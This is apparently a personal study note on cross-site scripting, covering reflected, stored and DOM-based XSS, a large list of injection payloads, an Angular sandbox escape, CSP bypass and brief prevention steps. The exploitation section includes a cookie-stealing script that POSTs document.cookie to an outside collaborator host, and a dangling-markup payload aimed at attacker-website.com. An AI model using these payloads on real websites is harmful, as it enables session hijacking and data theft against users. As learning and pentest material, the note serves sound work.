### General Notes

XSS is a vulnerability that allows attackers to compromise the user's interactions with a website.
- It bypasses the [[Same Origin Policy (SOP)]].
- Can steal other user [[Cookies]], or impersonate other user [[Sessions]].

This attack takes place by manipulating a website such that it returns malicious JavaScript to users.
- Once this JavaScript is executed at the victim's browser, the attack can then impersonate the user or control the user's interaction with the website.

There are 3 types of XSS attacks:
- **Reflected**: The injected scripts comes from the current [[HTTP]] request.
- **Stored**: The injected script is stored in the website's database, and is returned from there.
- **DOM-Based**: There is a vulnerability in the client side code that process input user data in an unsafe way.

---
### Finding XSS

Look at every user input, and test if it's displayed as output.
* [[HTTP]] headers
* Request parameters
* [[Cookies]].

Try injecting HTML and JavaScript and see how the website reacts:
- Try injecting HTML tag to see if the HTML is interpreted: `<i>, <h1>`.
- Try injecting JavaScript: `<script>alert('XSS')</script>`.

 Can use automated tools like [XSStrike](https://github.com/s0md3v/XSStrike).
```bash
xsstrike -u http://<url>/param=mins
```
- Must include the `param` to be tested against XSS.

---
### Reflected XSS

This type of XSS attack arises when there is an injected payload that is sent to the application through an [[HTTP]] request, and the application responds with that injected script in an immediate response.
- In the immediate HTTP response to the request carrying the payload, there is data reflected on the application as a result of the injected script.
- Untrusted data is sent to a web application, and this untrusted content is displayed.

> This is a server-side vulnerability.

If an attacker can control a script that is placed in a victim user's browser, then the attacker can compromise that user, however, that user has to be logged in for the attack to have a profound effect.
- To create a reflected XSS attack, the attacker needs to get a victim user to click on a link that contains this payload.
- Hence, reflected XSS attacks need some kind of external interaction by the user, making it less severe than other XSS types.
```
https://insecure-website.com/search?term=<script>alert(document.cookie)</script>
```

This can be done by sending emails with links, placing malicious links on websites, or sending links via social media.
- *The idea is to force a user to make a request that is controlled by the attacker.* 
- Forcing a request is as simple as clicking on a link that is crafted by an attacker.

---
### Stored (persistent) XSS

When the malicious payload is sent to the webserver and **stored** there.
- When an application receives data from an untrusted source and includes that data within its later HTTP responses by fetching it from the database.

When a webpage then loads, it pulls this payload from the server and the malicious code is displayed within the HTML output.
- Common in HTML forms where users submit content to the webserver and then is displayed back to users, such as comment sections, user profiles, and forums.

These attacks are self-contained within the application, and the user doesn't have to be prompted to click on something for it work like reflected XSS attacks.
- As a result, the users when they are subject to this attack will most probably be logged in, causing a damaging effect.

---
### DOM-Based XSS

This attack arises when JavaScript takes data from the attacker in a *source* and passes it to a *sink* that supports dynamic code execution.
- This is a type of [[DOM Based Vulnerabilities]].

The DOM based attack works as follows:
1. A *source* is a data source, like the `window.location` object which contains the URL.
2. A *sink* is a function that can execute code, like `eval` or `innerHTML`.
3. A *taint flow* is an executable path through which data moves from *source* to *sink*.
4. Attacker controlled data is placed in a *source*, and this data is propagated to a *sink* through the *taint flow*, causing execution of attacker controlled JavaScript.

> Can use DOM Invader extension in [[Burp Suite]].

> Check [[DOM Based Vulnerabilities#Source]] and [[DOM Based Vulnerabilities#Sinks]] for a list of sources and sinks.

###### Testing HTML Sinks
Testing for DOM-based means including a random alphanumeric string in a *source* and check where it appears in the HTML of the web application.
- A *source* can be in the URL, in a search bar, or wherever user input exists.
- Use `CTRL F` to look for the entered string in the source code (developer tools).
- Identify the HTML context, and try constructing a payload that breaks out, by adding special characters like quotes, angle brackets, and so on.
###### Testing JavaScript Sinks
This is harder than HTML sinks as the entered data will not be found in the source code.
- Use the JavaScript debugger to test how the input was sent and where.
- Use `CTRL F` to look for where the *source* is, and where it is used.
- Identify the JavaScript context, and look at the different variables and areas that the input data moves to.

> The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire.

###### Reflected DOM XSS

The server can process data from a request, (unsafe data), and then returns this data back in a response.
- This data is reflected in a response, and placed in the DOM.
- This data could be processed by a script on the website that could eventually place it in a *sink*.

> The idea is the same, to look for a *taint flow*, but the data could be coming from the server.

###### Stored DOM XSS

Data is stored at the server, and then returned to the website in a later response.
- A script with a *sink* could later process this data in an unsafe way.

###### DOM XSS in jQuery

The `attr()` function can change the attributes of DOM elements.
- If data read from a user controlled *source* and passed to the `attr()` function, the *sink*, we can insert a payload an create an XSS attack.

The `$()` selector function can also be used to inject malicious objects.
- `location.hash` was used for scrolling animations done using the `hashchange` event handler. ([[Events Module]])
- The `hash` is the area that is scrolled to by the website, and it is user controllable, so user input can be placed there.
- However, to exploit this, the `hashchange` event needs to be triggered without user interaction, which can be done using an `iframe`.

```
<iframe src = "https://website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'"> </iframe>
```

This basically loads the website in an `iframe` and adds at the end the `#` character.
- Once the `iframe` has loaded, the `src` attribute has `<img src=1 onerror=alert(1)>` appended to it, which is basically appending this payload at the end of the URL.
- This causes the URL to look like this: `https://website.com#<img src=1 onerror=alert(1)>`.
- This triggers the `hashchange` event without any user interaction, and causes the `alert` to pop.

###### DOM XSS in [[Angular]]

If a webpage uses the `ng-app` attribute, JavaScript inside double curly braces `{{ <code> }}` will be executed anywhere inside the HTML.

Use the `constructor` function to return references to creating functions. 
- These functions can be executed by adding `()` afterwards. [Function Constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function).

Used by going to a function in scope, and then calling the constructor with the `alert` function.
```
{{ $new.constructor('alert()') () }}
```
- The `$` is used in JavaScript frameworks and libraries.

Checking the functions in the scope using the `id` of an element in that scope.
```
angular.element(document.getElementById('<ID>')).scope()
```

---
### Injections and Payloads

Some payloads and methods to inject payloads.
- If the spaces cause errors, remove them.
- Try using all special characters to see which ones work: `< > " ' \ / ;`
- `iframes` can be used to create attacks that operate without user input.

Sometimes, trying to inject special characters like `"` gets escaped by the addition of a backslash `\`.
- Add an extra backslash `\` such that the one added by the application gets escaped by the one we added.
```
\" alert(1)
```

###### Injecting in HTML Tags

```
<img src=1 onerror=alert(1)>
```
- If tags and events are blocked, use the [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and try all the tags and events there using [[Burp Suite]] Intruder.

We can also create custom tags of our own.
```
<script> location = "https://vulnerable-website/search= <mins id=omar onfocus=alert(document.cookie)> tabindex=1 #omar"; </script>
```
- This script locates to the vulnerable website and injects in the `search` parameter a custom tag that alerts the cookie.
- The `onfocus` event works when the browser TABs onto the tag, so we use `tabindex` to automatically tab once to it, since we have the `#omar` that goes to it.

The `svg` tag allows for other tags inside it, which can be used to craft more complex exploits where some tags are blocked.
``` HTML
<svg> <animatetransform onbegin=alert(1)> </svg>

<svg> 
  <a>
    <animate attributeName='href' values='javascript:alert(1)'></animate>
    <text x='10' y='10'> Click </text>
  </a> 
</svg>
```

###### Injecting in HTML Attributes

Terminate the attribute, then close the tag, then add a new tag.
```
mins"> <svg onload=alert(1)>
```

This terminates the tag, but doesn't add the closing quotes and angle brackets at the end such that the injected attribute's own ones are used, ensuring proper syntax.
```
"> <body onload="alert()
```

If terminating the tag itself is hard since angle brackets are usually blocked, simply add a new attribute.
```
" onfocus=alert() autofocus x="
```
- This creates an `onfocus` event, and adds the `autofocus` attribute to trigger the `onfocus` automatically.
- To ensure there is no syntax error, it then closes off the remainder of the attribute and the tag.

If the source is an `href` attribute, we can execute JavaScript code using the [[Protocol]].
```
javascript:alert()
```

Access keys allow you to provide keyboard shortcuts that reference a specific element, done using the `accesskey` attribute. 
```
accesskey="x" onclick="alert()"
```
- When the letter defined `x` is pressed with `ALT` or `ALT SHIFT`, the event `onclick` will fire, producing the `alert()`.

###### Injecting in JavaScript

We can simply terminate the current script and add a new one.
```
</script><img src=1 onerror=alert(document.domain)>
```

To escape from a string inside the JavaScript.
```
'-alert(document.domain)-' 
';alert(document.domain)//

\'-alert(document.domain)-\' 
\';alert(document.domain)//
```
- Try adding `\` before the quotes if they are escaped by the application.
- Adding `//` comments out everything after it.

If the brackets are encoded, we can use the `throw` exception handler.
```
onerror=alert;throw 1
```
- The `throw` passes the 1 to the exception handler, which has the `alert()` function assigned it to.

###### Using HTML- [[Web Encoding]]

Using HTML encoding to bypass sanitization checks.
- The browser can decode the encoded attack while interpreting the JavaScript, so the attack succeeds.
```
&apos;-alert(document.domain)-&apos;
```

Find the list of codes [here](https://html.spec.whatwg.org/multipage/named-characters.html#named-character-references).
- Can also use the hex version encoding, or numbers.

###### JavaScript String Literals

Similar to Angular [[String Interpolation]], where there is JavaScript executed inside html between the ` `` ` backticks.
```
${alert(1)}
```

###### Dangling Markup Injection

Injecting an XSS payload, but not enclosing it properly.
- When the browser parses the new page, it will keep including data from the HTML of the page until an appropriate character that closes off the injection is faced.
- This allows attackers to capture data from the page, which might include sensitive information.

```
"><img src='//attacker-website.com?
```

> The Chrome browser has decided to tackle dangling markup attacks by preventing tags like `img` from defining URLs containing raw characters such as angle brackets and newlines. This will prevent attacks since the data that would otherwise be captured will generally contain those raw characters, so the attack is blocked.

---
### Client Side Template Injection

> These vulnerabilities arise when client side frameworks dynamically embed user input into the webpages.
> These frameworks scan the template and executes any expressions that it can.
> These can be exploited via XSS.

> Using `.charAt=[].join` causes the function to return all characters sent to it.
> If there are no strings allowed, by preventing quotes and double quotes, we can use `String.fromCharCode()`.
> We don't have access to `String`, so we need to use `fromCharCode()` from an actual string variable, or creating a string.
> Use `$eval()` to create strings, or the `[1]|orderBy:'String'` function.
> This String in the end can be created using `fromCharCode()`.

>An example payload would be.
```
toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
>The first line creates an empty string `''` and escapes from the Angular sandbox.
>The second line uses that string to create a string given its ASCII codes in order.
>Those ASCII codes translate to `x=alert(1)`.

---
### Exploiting XSS

###### [[Cookies]] Stealing

We are stealing a user's cookies and then using them to steal their logged in session.
- JavaScript can only access [[Cookies]] if the `HttpOnly` flag is disabled. 
- The victim must be logged in.

> Check [[Session Security#Using Cross Site Scripting (XSS)]] for more payloads.

The idea is to send cookies to an attacker controlled domain, allowing an attacker to steal the user's [[Sessions]].
- Here is using [[Burp Suite]] Collaborator.
```
<script>
fetch('https://ydfa57m120i4eumqf8396fs67xdo1hp6.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

To send cookies:
```JavaScript
document.location='our-ip/'+document.cookie
```
To start a listener:
```bash
sudo php -S 0.0.0.0:80
```

###### Password Capturing

Can utilize password managers that auto-fill in password fields by adding a password field that is controlled by the attacker.
- The data in the password field is then sent to an attacker controlled domain.

---
### Content Security Policy (CSP)

This is a browser security mechanism that is used to protect against XSS.
- It restricts the resources that a page can load, such as images and scripts.
- It restricts if pages can be loaded using frames like `iframe`.

For CSP to be enabled, the responses need to contain the [[HTTP]] header `Content-Security-Policy`. 
- The value of this header contains policies, and these are the ones used.
- The policies are a list of directives that are separated by semicolons.

> Not in Firefox.

Some directives that can be used:
- To allow scripts or images to be loaded only from a page with the same origin ([[Same Origin Policy (SOP)]]).
```
script-src 'self'
img-src 'self'
```

- To allow scripts or images to be loaded from a page with a given domain.
```
script-src https://scripts.normal-website.com
img-src https://images.normal-website.com
```

Loading scripts from external domains is dangerous, as the external domains themselves could be vulnerable.
- Therefore, the CSP whitelist should contain only trusted domains.
- CSP also uses *nonces* and *hashes* to to specify trusted sources.

Nonces are random values that are generated, and should be hard to guess.
- Both pages, that is, the page loading the resource, and the page supplying the resource should generate the same nonce.
- This nonce that the CSP directive specifies should be the same one that is then put in a tag in the loaded resource.

Hashes can be made of the content of the trusted resource, and it is specified in the CSP directive.
- If the hash of the loaded resource doesn't match, then the resource is not trusted.
- The value of the hash needs to be updated in case the actual trusted resource changes.

##### Exploiting CSP

If attacker input is reflected into the CSP directives, then an attacker can overwrite existing directives or add new ones.
- This usually happens in the `report-uri` directive.
- Injecting a semicolon and then adding new directives.

Overwriting the `script-src` directive is not allowed, but the `script-src-elem` can be used to control `script` elements.
- This allows overwriting existing `script-src` directives.

> Open the console while playing with this to see the results.

Assume the `token` parameter is reflected into the `report-uri` directive.
``` HTML
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```
- Added the `unsafe-inline` directive value that takes any script.

---
### Preventing XSS Attacks

1. Filter input on arrival
2. Encode data on output
3. Use appropriate response headers
4. Content Security Policy (CSP)

---
